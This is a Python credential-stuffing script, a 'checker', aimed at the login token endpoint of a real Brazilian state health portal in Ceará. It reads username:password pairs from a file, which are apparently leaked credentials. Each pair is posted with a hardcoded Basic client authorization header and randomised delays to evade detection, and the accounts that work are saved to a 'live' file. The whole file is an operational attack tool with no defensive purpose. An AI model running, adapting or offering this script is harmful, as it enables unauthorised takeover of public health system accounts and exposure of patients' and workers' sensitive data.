import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import threading
import os

# Cores ANSI
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Configurações
URL = 'https://digital.saude.ce.gov.br/auth/api/connect/token'
MAX_THREADS = 5
DELAY = (1, 3)
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'error.txt'

# Estatísticas
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time(),
    'running': True
}

# Headers fixos
HEADERS = {
    'Host': 'digital.saude.ce.gov.br',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Authorization': 'Basic c2VzYS5jZS51aTokM0NyM3RFIQ==',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    'Origin': 'https://digital.saude.ce.gov.br',
    'Referer': 'https://digital.saude.ce.gov.br/auth/'
}

def update_panel():
    while stats['running']:
        elapsed = time.time() - stats['start_time']
        print("\033[H\033[J", end='')
        print(f"{CYAN}══════════════════════════════════{RESET}")
        print(f"{YELLOW}      SAÚCE CE CHECKER{RESET}")
        print(f"{CYAN}══════════════════════════════════{RESET}")
        print(f"{GREEN} ✅ LIVE: {stats['live']}{RESET}")
        print(f"{RED} ❌ DIE: {stats['die']}{RESET}")
        print(f"{YELLOW} ⚠ ERROR: {stats['error']}{RESET}")
        print(f"{CYAN} ⏳ TEMPO: {elapsed:.2f}s{RESET}")
        print(f"{CYAN}══════════════════════════════════{RESET}", end='\r')
        time.sleep(0.1)

def read_credentials():
    credentials = []
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as file:
            for line in file:
                if ':' in line:
                    login, password = line.strip().split(':', 1)
                    credentials.append((login.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(f"{RED}Erro ao ler arquivo: {e}{RESET}")
    return credentials

def random_delay():
    time.sleep(random.uniform(*DELAY))

def check_account(account):
    username, password = account
    try:
        data = {
            'username': username,
            'password': password,
            'grant_type': 'password',
            'scope': 'api'
        }

        response = requests.post(URL, headers=HEADERS, data=data, timeout=15)
        
        if response.status_code == 200:
            if 'access_token' in response.json():
                stats['live'] += 1
                save_result(LIVE_FILE, username, password)
                return f"{GREEN}✅ LIVE - {username}:{password}{RESET}"
            else:
                stats['die'] += 1
                save_result(DIE_FILE, username, password)
                return f"{RED}❌ DIE - {username}:{password}{RESET}"
        elif response.status_code == 400:
            error_desc = response.json().get('error_description', '')
            if 'invalid_username_or_password' in error_desc:
                stats['die'] += 1
                save_result(DIE_FILE, username, password)
                return f"{RED}❌ DIE - {username}:{password}{RESET}"
            else:
                stats['error'] += 1
                save_result(ERROR_FILE, username, password, error_desc)
                return f"{YELLOW}⚠ ERROR - {username}:{password} | {error_desc[:50]}{RESET}"
        else:
            stats['error'] += 1
            save_result(ERROR_FILE, username, password, f"HTTP {response.status_code}")
            return f"{YELLOW}⚠ ERROR - {username}:{password} | HTTP {response.status_code}{RESET}"
            
    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, username, password, str(e))
        return f"{YELLOW}⚠ ERROR - {username}:{password} | {str(e)[:50]}{RESET}"

def save_result(filename, username, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            if extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except Exception as e:
        print(f"{RED}Erro ao salvar resultado: {e}{RESET}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(f"{RED}Arquivo {LOGINS_FILE} não encontrado!{RESET}")
        return

    for f in [LIVE_FILE, DIE_FILE, ERROR_FILE]:
        if os.path.exists(f):
            os.remove(f)

    credentials = read_credentials()
    if not credentials:
        print(f"{RED}Nenhuma credencial válida encontrada!{RESET}")
        return

    panel_thread = threading.Thread(target=update_panel)
    panel_thread.daemon = True
    panel_thread.start()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for account in credentials:
            futures.append(executor.submit(check_account, account))
            random_delay()

        for future in as_completed(futures):
            print(future.result())

    stats['running'] = False
    panel_thread.join()

    print(f"{CYAN}\n✅ Verificação concluída!{RESET}")
    print(f"{GREEN}Contas válidas: {LIVE_FILE}{RESET}")
    print(f"{RED}Contas inválidas: {DIE_FILE}{RESET}")
    print(f"{YELLOW}Erros: {ERROR_FILE}{RESET}")

if __name__ == '__main__':
    main()